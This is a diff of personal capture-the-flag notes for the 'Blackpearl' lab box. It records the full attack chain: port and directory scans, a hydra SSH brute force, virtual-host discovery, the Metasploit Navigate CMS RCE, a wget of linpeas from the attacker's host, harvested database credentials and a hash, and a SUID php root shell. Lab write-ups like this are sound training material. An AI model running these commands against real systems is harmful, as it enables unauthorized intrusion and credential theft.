@@ -1,5 +1,6 @@
 **nmap -A -p- 192.168.86.199**
-   'PORT   STATE SERVICE VERSION
+   '''
+   PORT   STATE SERVICE VERSION
     22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
     | ssh-hostkey:
     |   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
@@ -11,7 +12,8 @@
     80/tcp open  http    nginx 1.14.2 ****
     |_http-title: Welcome to nginx!
     |_http-server-header: nginx/1.14.2
-    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel'
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    '''
 ---
 **ffuf - No good**
 ---
@@ -22,7 +24,7 @@
     + <html>'
 ---
 **Gobuster**
-'gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --wildcard 2>/dev/null | grep "Status: 200"'
+`gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --wildcard 2>/dev/null | grep "Status: 200"`
 /secret               (Status: 200) [Size: 209]
     'DL file:
         OMG you got r00t !
@@ -30,13 +32,15 @@
        <This message is here so that you don't waste more time directory busting this particular website.>'
 ---
 **Hydra**
-'hydra -hydra -l alek -P /usr/share/wordlists/rockyou.txt ssh://192.168.86.199 '
+`hydra -hydra -l alek -P /usr/share/wordlists/rockyou.txt ssh://192.168.86.199`
 ---
 **DNSRECON**
-'dnsrecon -r 127.0.0.0/24 -n 192.168.86.199 -d extra (-d is domain && any domain is required) #**Virtual Host Routing**
+`dnsrecon -r 127.0.0.0/24 -n 192.168.86.199 -d extra` (-d is domain && any domain is required) #**Virtual Host Routing**
+             '''
         [*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
-        [+] 	 PTR blackpearl.tcm 127.0.0.1
+        [+] PTR blackpearl.tcm 127.0.0.1
         [+] 1 Records Found'
+             '''
    
 1. **sudo vi /etc/hosts**
         <ip>    blackpearl.tcm
@@ -46,28 +50,32 @@
             /nagivate - login.php ( Navigate CMS v2.8, © 2021)
                     **Always google new environment**
                 https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/  
-        msfconsole use use exploit/multi/http/navigate_cms_rce
-                set domain - blackpearl.tcm : run
+        `msfconsole use exploit/multi/http/navigate_cms_rce`
+        `set domain - blackpearl.tcm : run`
+                
  2. **meterpreter > shell:**
         'python -c 'import pty;pty.spawn("/bin/sh")''
             - pwd: ~/blackpearl.tcm/navigate 
             - ls -alth #This directory has higher permissions
         'wget http://<ip>/linpeas.sh linpeas.sh' # upload privecs
+   
  3. **linpeas.sh:**
         + /var/www/blackpearl.tcm/navigate/cfg/globals.php:define('PDO_PASSWORD', "H4x0r");
         + /var/www/blackpearl.tcm/navigate/cfg/globals.php:define('PDO_USERNAME', "alek");
-        + 'mysql -u alek -p (pw H4x0r)'  #**Success**
         + 'show databases; show tables; use navigate'
                 'select * from nv_users; ::
-                    alek && PW: 26f1e0e7b718d27e0428e1b3b4b3f677'
+                 alek && PW: 26f1e0e7b718d27e0428e1b3b4b3f677 #wasted time to break hash'
+   
  4. **ssh alek@<ip> -p H4x0r**:: **Success**
-            'find / -perm /6000 2</dev/null' ![GTFObins](https://gtfobins.github.io/gtfobins/php/#suid)
+            `find / -perm /6000 2</dev/null` ![GTFObins](https://gtfobins.github.io/gtfobins/php/#suid)
                 #/php - GTFObins - click php -> SUID
-            '/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"'  # **Success**
+            `/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"`  # **Success**
+   '''
                         $ whoami::
                           root
                         $cd root/ && cat flag.txt ::
                             'Good job on this one. Finding the domain name may have been a little guessy, but the goal of this box \ 
                              is mainly to teach about Virtual Host Routing which is used in a lot of CTF.'
+   '''
 
                     
